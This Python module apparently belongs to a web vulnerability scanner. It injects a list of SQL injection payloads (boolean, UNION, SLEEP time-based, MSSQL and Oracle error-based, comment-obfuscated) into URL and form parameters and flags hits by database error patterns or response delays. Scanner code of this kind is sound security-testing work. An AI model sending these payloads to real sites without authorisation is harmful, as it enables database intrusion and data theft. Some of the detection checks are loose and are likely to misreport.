from core.base import VulnCheck
from urllib.parse import urlparse, parse_qs, quote, urljoin
from colorama import Fore
import re
from bs4 import BeautifulSoup
import time

class SQLiCheck(VulnCheck):
    def __init__(self, scanner):  # Tambahkan parameter scanner
        super().__init__(scanner)  # Panggil parent constructor
        self.error_patterns = [
            re.compile(r"SQL syntax.*MySQL", re.IGNORECASE),
            re.compile(r"ORA-[0-9]{5}", re.IGNORECASE),
            re.compile(r"Unclosed quotation mark", re.IGNORECASE),
            re.compile(r"PostgreSQL.*ERROR", re.IGNORECASE),
            re.compile(r"Warning.*mysqli", re.IGNORECASE),
            re.compile(r"Microsoft SQL Server", re.IGNORECASE)
        ]

    def run(self):
        print(Fore.MAGENTA + "[*] Running module: " + self.__class__.__name__)
        print(Fore.CYAN + "\n[+] Checking for SQL injection vulnerabilities...")

        test_payloads = [
            ("' OR '1'='1", "Basic boolean-based"),
            ("' OR 1=1--", "Comment-based"),
            ("\" OR \"\"=\"", "Quote-based"),
            ("') OR ('a'='a", "Parenthesis-based"),
            ("' OR SLEEP(5)--", "Time-based (blind)"),
            ("' UNION SELECT null,version()--", "Union-based"),
            ("' AND 1=CONVERT(int,@@version)--", "Error-based (MSSQL)"),
            ("'||(SELECT 0x4e65746f776b7363 FROM DUAL)--", "Oracle-specific"),
            ("'/**/OR/**/'1'='1", "Obfuscated with comments")
        ]

        try:
            response = self.scanner.session.get(self.scanner.base_url, verify=False, timeout=15)
            soup = BeautifulSoup(response.text, 'html.parser')
            target_params = self._collect_parameters(response, soup)

            if not target_params:
                print(Fore.YELLOW + "[!] No parameters found. Try scanning deeper paths or forms.")
                return

            vulnerable_params = []
            for param_info in target_params:
                param = param_info['name']
                original_value = param_info['value']
                source = param_info['source']

                for payload, payload_type in test_payloads:
                    try:
                        if source == "url":
                            test_url = response.url.replace(
                                f"{param}={original_value}",
                                f"{param}={quote(payload)}"
                            )
                            start_time = time.time()
                            test_response = self.scanner.session.get(test_url, verify=False, timeout=20)
                            elapsed = time.time() - start_time
                        elif source == "form":
                            form_data = {p['name']: p['value'] for p in param_info['form_params']}
                            form_data[param] = payload
                            start_time = time.time()
                            test_response = self.scanner.session.post(
                                urljoin(self.scanner.base_url, param_info['action']),
                                data=form_data,
                                verify=False,
                                timeout=20
                            )
                            elapsed = time.time() - start_time

                        if self._is_vulnerable(test_response, payload, payload_type, elapsed):
                            vulnerable_params.append({
                                'param': param,
                                'payload': payload,
                                'type': payload_type,
                                'source': source,
                                'elapsed': f"{elapsed:.2f}s" if "SLEEP" in payload else None
                            })
                            break

                    except Exception as e:
                        print(Fore.YELLOW + f"[?] Error testing {param}: {str(e)}")
                        continue

            if vulnerable_params:
                for vuln in vulnerable_params:
                    example = f"Payload: {vuln['payload']}"
                    if vuln['elapsed']:
                        example += f" (Delay: {vuln['elapsed']})"

                    self.scanner.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'location': f"{vuln['source'].upper()} Parameter: {vuln['param']}",
                        'example': example,
                        'severity': 'Critical',
                        'solution': 'Use parameterized queries/prepared statements',
                        'references': ['CWE-89', 'OWASP-A1']
                    })
            else:
                print(Fore.GREEN + "[+] No SQLi vulnerabilities detected")

        except Exception as e:
            print(Fore.YELLOW + f"[?] Critical error during SQLi scan: {str(e)}")
            self.scanner.errors.append({
                'module': self.__class__.__name__,
                'error': str(e),
                'url': self.scanner.base_url
            })

    def _collect_parameters(self, response, soup):
        params = []
        
        # URL Parameters
        parsed = urlparse(response.url)
        query_params = parse_qs(parsed.query)
        for param in query_params:
            params.append({
                'name': param,
                'value': query_params[param][0],
                'source': 'url'
            })

        # Form Parameters
        for form in soup.find_all('form'):
            form_params = []
            action = form.get('action', '')
            method = form.get('method', 'get').lower()

            for input_tag in form.find_all(['input', 'textarea']):
                if input_tag.get('name'):
                    form_params.append({
                        'name': input_tag.get('name'),
                        'value': input_tag.get('value', '')
                    })

            for param in form_params:
                params.append({
                    'name': param['name'],
                    'value': param['value'],
                    'source': 'form',
                    'form_params': form_params,
                    'action': action,
                    'method': method
                })

        return params

    def _is_vulnerable(self, response, payload, payload_type, elapsed_time=0):
        content = response.text.lower()
        
        # Error-based detection
        if any(pattern.search(content) for pattern in self.error_patterns):
            return True

        # Time-based detection
        if "sleep" in payload.lower() and elapsed_time > 4:
            return True

        # Union-based detection
        if payload_type == "Union-based" and ("null" in content or "version()" in content):
            return True

        # Boolean-based detection
        if payload_type.endswith("boolean-based") and response.status_code == 200:
            if len(content) != len(response.history[0].text) if response.history else 0:
                return True

        return False